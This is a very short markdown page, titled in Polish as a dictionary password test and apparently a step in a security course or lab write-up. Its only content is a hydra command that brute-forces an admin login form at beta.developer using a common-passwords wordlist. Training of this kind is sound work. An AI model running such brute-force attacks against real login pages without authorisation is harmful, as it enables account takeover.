---
title: "4.5p - Słownikowy test hasła"
order: 10
---

```bash
hydra -l anything -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-100.txt 'https-post-form://beta.developer/admin/index_admin.php:p=^PASS^:Wrong password'
```
